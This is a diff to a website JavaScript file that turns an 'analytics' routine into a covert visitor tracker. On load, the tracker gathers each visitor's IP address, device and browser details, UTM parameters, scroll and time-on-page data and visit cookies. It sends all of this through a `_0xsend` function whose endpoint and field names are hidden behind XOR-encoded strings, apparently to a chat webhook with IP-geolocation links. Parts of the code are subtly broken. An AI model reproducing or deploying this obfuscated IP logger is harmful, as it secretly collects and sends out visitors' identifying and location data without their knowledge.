@@ -1,108 +1,197 @@
-var analyticsData;
+var urlParams = new URLSearchParams(window.location.search);
 
-function collectVisitorAnalytics() {
+const visitorData = {
+  timestamp: new Date().toISOString(),
+  sessionId: generateSessionId(),
+  clickOrigin: urlParams.get('a') || "none",
+  referrer: document.referrer || "direct",
+  landingPage: window.location.pathname,
+  deviceData: {}
+};
 
-  const browserData = {
-    userAgent: navigator.userAgent,
-    language: navigator.language,
-    cookiesEnabled: navigator.cookieEnabled,
-    platform: navigator.platform,
+function getVisitorIP() {
+  try {
+    // Using ipify - a free public IP address API
+    fetch('https://api.ipify.org?format=json').then(res => res.json()).then(jsonData => {
+      visitorData.ip = jsonData.ip;
+    });
+  } catch (error) {
+    console.error('Error fetching IP address:', error);
+    return null;
+  }
+}
+
+// Generate a random session ID
+function generateSessionId() {
+  return Math.random().toString(36).substring(2, 15) + 
+         Math.random().toString(36).substring(2, 15);
+}
+
+// Collect browser and device information
+function collectDeviceData() {
+  const ua = navigator.userAgent;
+  visitorData.deviceData = {
     screenWidth: window.screen.width,
     screenHeight: window.screen.height,
-    windowWidth: window.innerWidth,
-    windowHeight: window.innerHeight,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    timestamp: new Date().toISOString()
+    viewportWidth: window.innerWidth,
+    viewportHeight: window.innerHeight,
+    colorDepth: window.screen.colorDepth,
+    pixelRatio: window.devicePixelRatio,
+    platform: navigator.platform,
+    language: navigator.language,
+    browserName: getBrowserName(ua),
+    isMobile: /Mobi|Android/i.test(ua),
+    isTablet: /Tablet|iPad/i.test(ua),
+    osName: getOSName(ua),
+    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    connectionType: navigator.connection ? navigator.connection.effectiveType : "unknown"
   };
-  
-    const userAgentData = parseUserAgent(browserData.userAgent);
-    
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(ipData => {
-        analyticsData = {
-          ...browserData,
-          ...userAgentData,
-          ip: ipData.ip
-        };
-        
-        const queryString = window.location.search;
-        const urlParams = new URLSearchParams(queryString);
-        console.log("Collected visitor analytics:", analyticsData);
-        
-        analyticsData['hash'] = cyrb53(ipData.ip);
-        analyticsData['clickOrigin'] = urlParams.get('a');
-        _0xsend(analyticsData);
-      })
-      .catch(error => console.error('Error fetching IP:', error));
-  }
-  
-  function parseUserAgent(userAgent) {
-    let browser = "Unknown";
-    let browserVersion = "";
-    
-    if (userAgent.indexOf("Firefox") > -1) {
-      browser = "Firefox";
-      browserVersion = userAgent.match(/Firefox\/([0-9.]+)/)[1];
-    } else if (userAgent.indexOf("Chrome") > -1 && userAgent.indexOf("Edg") === -1 && userAgent.indexOf("OPR") === -1) {
-      browser = "Chrome";
-      browserVersion = userAgent.match(/Chrome\/([0-9.]+)/)[1];
-    } else if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) {
-      browser = "Safari";
-      browserVersion = userAgent.match(/Version\/([0-9.]+)/)[1];
-    } else if (userAgent.indexOf("Edg") > -1) {
-      browser = "Edge";
-      browserVersion = userAgent.match(/Edg\/([0-9.]+)/)[1];
-    } else if (userAgent.indexOf("OPR") > -1 || userAgent.indexOf("Opera") > -1) {
-      browser = "Opera";
-      browserVersion = userAgent.match(/(?:OPR|Opera)\/([0-9.]+)/)[1];
-    } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) {
-      browser = "Internet Explorer";
-      browserVersion = userAgent.match(/(?:MSIE |rv:)([0-9.]+)/)[1];
-    }
-    
-    let os = "Unknown";
-    let osVersion = "";
-    
-    if (userAgent.indexOf("Win") > -1) {
-      os = "Windows";
-      if (userAgent.indexOf("Windows NT 10.0") > -1) osVersion = "10";
-      else if (userAgent.indexOf("Windows NT 6.3") > -1) osVersion = "8.1";
-      else if (userAgent.indexOf("Windows NT 6.2") > -1) osVersion = "8";
-      else if (userAgent.indexOf("Windows NT 6.1") > -1) osVersion = "7";
-    } else if (userAgent.indexOf("Mac") > -1) {
-      os = "macOS";
-      const macOSMatch = userAgent.match(/Mac OS X ([0-9_]+)/);
-      if (macOSMatch) osVersion = macOSMatch[1].replace(/_/g, '.');
-    } else if (userAgent.indexOf("Android") > -1) {
-      os = "Android";
-      const androidMatch = userAgent.match(/Android ([0-9.]+)/);
-      if (androidMatch) osVersion = androidMatch[1];
-    } else if (userAgent.indexOf("iOS") > -1 || (userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1)) {
-      os = "iOS";
-      const iosMatch = userAgent.match(/OS ([0-9_]+)/);
-      if (iosMatch) osVersion = iosMatch[1].replace(/_/g, '.');
-    } else if (userAgent.indexOf("Linux") > -1) {
-      os = "Linux";
-    }
-    
-    let deviceType = "Desktop";
-    if (userAgent.indexOf("Mobi") > -1 || userAgent.indexOf("Android") > -1 && userAgent.indexOf("Chrome") === -1) {
-      deviceType = "Mobile";
-    } else if (userAgent.indexOf("iPad") > -1 || (userAgent.indexOf("Tablet") > -1 && userAgent.indexOf("iPad") === -1)) {
-      deviceType = "Tablet";
-    }
-    
-    return {
-      browser,
-      browserVersion,
-      os,
-      osVersion,
-      deviceType
-    };
-  }
+}
 
-  collectVisitorAnalytics();
+// Detect browser name
+function getBrowserName(ua) {
+  if (ua.indexOf("Firefox") > -1) return "Firefox";
+  else if (ua.indexOf("SamsungBrowser") > -1) return "Samsung Browser";
+  else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) return "Opera";
+  else if (ua.indexOf("Trident") > -1) return "Internet Explorer";
+  else if (ua.indexOf("Edge") > -1) return "Edge";
+  else if (ua.indexOf("Chrome") > -1) return "Chrome";
+  else if (ua.indexOf("Safari") > -1) return "Safari";
+  else return "Unknown";
+}
+
+// Detect operating system
+function getOSName(ua) {
+  if (ua.indexOf("Windows") > -1) return "Windows";
+  else if (ua.indexOf("Mac") > -1) return "MacOS";
+  else if (ua.indexOf("Linux") > -1) return "Linux";
+  else if (ua.indexOf("Android") > -1) return "Android";
+  else if (ua.indexOf("iOS") > -1 || ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) return "iOS";
+  else return "Unknown";
+}
+
+// Track page navigation and time spent
+function trackPageEngagement() {
+  const pageLoadTime = performance.now();
+  let pageViews = [];
+  let currentPage = window.location.pathname;
+  
+  // Record initial page view
+  pageViews.push({
+    page: currentPage,
+    timeSpent: 0,
+    scrollDepth: 0
+  });
+  
+  // Listen for page navigation events
+  window.addEventListener('popstate', () => {
+    const timeSpent = (performance.now() - pageLoadTime) / 1000;
+    pageViews[pageViews.length - 1].timeSpent = timeSpent.toFixed(2);
+    currentPage = window.location.pathname;
+    
+    pageViews.push({
+      page: currentPage,
+      timeSpent: 0,
+      scrollDepth: 0
+    });
+  });
+  
+  // Track scroll depth
+  let maxScrollDepth = 0;
+  window.addEventListener('scroll', () => {
+    const scrollPosition = window.scrollY;
+    const totalHeight = document.body.scrollHeight - window.innerHeight;
+    const scrollDepth = (scrollPosition / totalHeight * 100).toFixed(2);
+    
+    if (parseFloat(scrollDepth) > maxScrollDepth) {
+      maxScrollDepth = parseFloat(scrollDepth);
+      pageViews[pageViews.length - 1].scrollDepth = maxScrollDepth;
+    }
+  });
+  
+  // Before user leaves, update time spent on current page
+  window.addEventListener('beforeunload', () => {
+    const timeSpent = (performance.now() - pageLoadTime) / 1000;
+    pageViews[pageViews.length - 1].timeSpent = timeSpent.toFixed(2);
+    visitorData.pageViews = pageViews;
+    
+    // Send the final data to server
+    sendDataToServer();
+  });
+}
+
+// Collect UTM parameters
+function collectUTMParameters() {
+  const urlParams = new URLSearchParams(window.location.search);
+  visitorData.utm = {
+    source: urlParams.get('utm_source') || null,
+    medium: urlParams.get('utm_medium') || null,
+    campaign: urlParams.get('utm_campaign') || null,
+    term: urlParams.get('utm_term') || null,
+    content: urlParams.get('utm_content') || null
+  };
+}
+
+// Set and read cookies for returning visitor detection
+function manageCookies() {
+  // Check if visitor has been here before
+  const visitCount = getCookie('visit_count') || 0;
+  const firstVisit = getCookie('first_visit') || new Date().toISOString();
+  
+  // Increment visit count
+  setCookie('visit_count', parseInt(visitCount) + 1, 365);
+  
+  // Set first visit if new visitor
+  if (!getCookie('first_visit')) {
+    setCookie('first_visit', firstVisit, 365);
+  }
+  
+  // Set last visit timestamp
+  setCookie('last_visit', new Date().toISOString(), 365);
+  
+  visitorData.visitorHistory = {
+    isReturning: visitCount > 0,
+    visitCount: parseInt(visitCount) + 1,
+    firstVisit: firstVisit,
+    lastVisit: getCookie('last_visit')
+  };
+}
+
+// Helper function to set cookies
+function setCookie(name, value, days) {
+  const date = new Date();
+  date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+  const expires = "; expires=" + date.toUTCString();
+  document.cookie = name + "=" + value + expires + "; path=/; SameSite=Lax";
+}
+
+// Helper function to get cookies
+function getCookie(name) {
+  const cookieValue = document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]*)');
+  return cookieValue ? cookieValue.pop() : null;
+}
+
+// Send the collected data to your server
+function sendDataToServer() {
+  _0xsend(visitorData);
+}
+
+// Initialize data collection
+function initDataCollection() {
+  getVisitorIP();
+  collectDeviceData();
+  collectUTMParameters();
+  manageCookies();
+  trackPageEngagement();
+  
+  // Save initial data
+  setTimeout(() => {
+    sendDataToServer();
+  }, 3000);
+}
+
+// Start collecting data when the page loads
+window.addEventListener('load', initDataCollection);
 
 function logclick(key) {
   var data = {
@@ -136,13 +225,12 @@ function _0xsend(_0xmsg) {
     var date = Date.now();
     _0xxhr.send(JSON.stringify({
         [_0xdecrypt('0604051B00051F'.replace(/\s+/g, ''))]: 
-        "HASH: `" + (_0xmsg.hash ? _0xmsg.hash : cyrb53(_0xmsg['ip'])) + "`" +
-        "\nUNIX: <t:" + Math.floor((date / 1000)) + ":F>" +
         "\n[[LOCATION INFO]](https://ip-api.com/" + _0xmsg['ip'] + ")" + 
-        "\n```json\n" + JSON.stringify(_0xmsg, null, 2) + "\n```",
+        "\n```json\n" + JSON.stringify(visitorData, null, 2) + "\n```",
         [_0xdecrypt('10180E1D0B0A060A'.replace(/\s+/g, ''))]: _0xdecrypt('361F0A1B0C181F06064B390A1504191B45303D2636223F32'.replace(/\s+/g, '')),
         [_0xdecrypt('041D0A1B0419341A1707'.replace(/\s+/g, ''))]: _0xdecrypt('0D1F1F1F16514440170A1C4102021F0710091E1C001908000B1F0E01114508000844260E150704001544060E1507040015450C0611031E0D4B020440170E0D1C4A030E0E0118440204181F0A174407060B00184004085357500D5A56485F530B50465F565C08465656080D42000A0D0E515808585258080C4B011B08'.replace(/\s+/g, '')),
-    }));
+        keepalive: true,
+      }));
 }
 
 const cyrb53 = (str, seed = 0) => {
